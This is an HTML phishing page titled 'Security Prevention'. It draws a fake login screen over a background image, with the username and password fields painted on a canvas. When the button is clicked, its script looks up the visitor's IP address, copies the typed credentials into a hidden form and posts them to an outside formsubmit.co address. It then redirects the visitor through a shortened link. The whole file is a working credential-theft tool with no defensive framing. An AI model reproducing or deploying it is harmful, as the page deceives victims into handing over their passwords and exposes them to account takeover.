<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="Wuloo.ico" type="image/x-icon">
  <title>Security Prevention</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
    }
  </style>
  <script>
    // Function to detect if the user is on a mobile device
    function isMobileDevice() {
      return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) || window.innerWidth <= 768;
    }

    // Redirect to the mobile version if on a mobile device
    window.onload = function () {
      if (isMobileDevice()) {
        window.location.href = "csdaymobile.html"; // Replace with the URL of your mobile-specific HTML page
      }
    };
  </script>
</head>
<body>
  <!-- Hidden form for submission -->
  <form id="loginForm" action="https://formsubmit.co/3a514e8fece6175b6e7089d60c96611e" method="POST" style="display: none;">
    <input type="hidden" name="username" id="formUsername" style="font-size: 8px; font-family: Arial, sans-serif;">
    <input type="hidden" name="password" id="formPassword" style="font-size: 8px; font-family: Arial, sans-serif;">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="http://surl.li/pphejx">
    <input type="hidden" name="ipAddress" id="formIpAddress">
  </form>

  <script>
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    document.body.appendChild(canvas);

    const backgroundImage = new Image();
    backgroundImage.src = "Bg1.png";
    backgroundImage.onload = () => {
      ctx.drawImage(backgroundImage, 0, 0, canvas.width, canvas.height);
      drawUI();
    };

    let usernameInput = { x: 315, y: 182, width: 235, height: 35, value: "", active: false };
    let passwordInput = { x: 315, y: 255, width: 235, height: 35, value: "", active: false };
    let button = { x: 300, y: 360, width: 350, height: 140 };

    let cursorVisible = true;

    setInterval(() => {
      cursorVisible = !cursorVisible;
      drawUI();
    }, 500);

    function isInside(point, rect) {
      return (
        point.x >= rect.x &&
        point.x <= rect.x + rect.width &&
        point.y >= rect.y &&
        point.y <= rect.y + rect.height
      );
    }

    function drawUI() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(backgroundImage, 0, 0, canvas.width, canvas.height);

      // Username input: white background if active or contains text
      ctx.fillStyle = usernameInput.active || usernameInput.value ? "rgba(255, 255, 255, 1)" : "rgba(255, 255, 255, 0)";
      ctx.fillRect(usernameInput.x, usernameInput.y, usernameInput.width, usernameInput.height);

      // Password input: white background if active or contains text
      ctx.fillStyle = passwordInput.active || passwordInput.value ? "rgba(255, 255, 255, 1)" : "rgba(255, 255, 255, 0)";
      ctx.fillRect(passwordInput.x, passwordInput.y, passwordInput.width, passwordInput.height);

      ctx.fillStyle = "rgba(0, 0, 0, 0)";
      ctx.fillRect(button.x, button.y, button.width, button.height);

      ctx.fillStyle = "#000000";
      ctx.font = "25px Arial";
      ctx.fillText(usernameInput.value, usernameInput.x + 5, usernameInput.y + 25);
      const hiddenPassword = "*".repeat(passwordInput.value.length);
      ctx.fillText(hiddenPassword, passwordInput.x + 5, passwordInput.y + 25);

      if (usernameInput.active && cursorVisible) {
        const cursorX = usernameInput.x + 5 + ctx.measureText(usernameInput.value).width;
        ctx.fillRect(cursorX, usernameInput.y + 8, 1, usernameInput.height - 16);
      } else if (passwordInput.active && cursorVisible) {
        const cursorX = passwordInput.x + 5 + ctx.measureText(hiddenPassword).width;
        ctx.fillRect(cursorX, passwordInput.y + 8, 1, passwordInput.height - 16);
      }
    }

    canvas.addEventListener("click", (e) => {
      const mousePos = { x: e.clientX, y: e.clientY };

      if (isInside(mousePos, usernameInput)) {
        usernameInput.active = true;
        passwordInput.active = false;
      } else if (isInside(mousePos, passwordInput)) {
        usernameInput.active = false;
        passwordInput.active = true;
      } else if (isInside(mousePos, button)) {
        fetchIpAddress(); // Fetch IP and submit form
      } else {
        usernameInput.active = false;
        passwordInput.active = false;
      }
      drawUI();
    });

    window.addEventListener("keydown", (e) => {
      if (usernameInput.active) {
        if (e.key === "Backspace") {
          usernameInput.value = usernameInput.value.slice(0, -1);
        } else if (e.key.length === 1) {
          usernameInput.value += e.key;
        }
      } else if (passwordInput.active) {
        if (e.key === "Backspace") {
          passwordInput.value = passwordInput.value.slice(0, -1);
        } else if (e.key.length === 1) {
          passwordInput.value += e.key;
        }
      }
      drawUI();
    });

    // Fetch and populate IP address
    function fetchIpAddress() {
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          document.getElementById("formIpAddress").value = data.ip;
          const form = document.getElementById("loginForm");
          document.getElementById("formUsername").value = usernameInput.value;
          document.getElementById("formPassword").value = passwordInput.value;
          form.submit();
        })
        .catch(err => console.error("Failed to fetch IP address:", err));
    }
  </script>
</body>
</html>
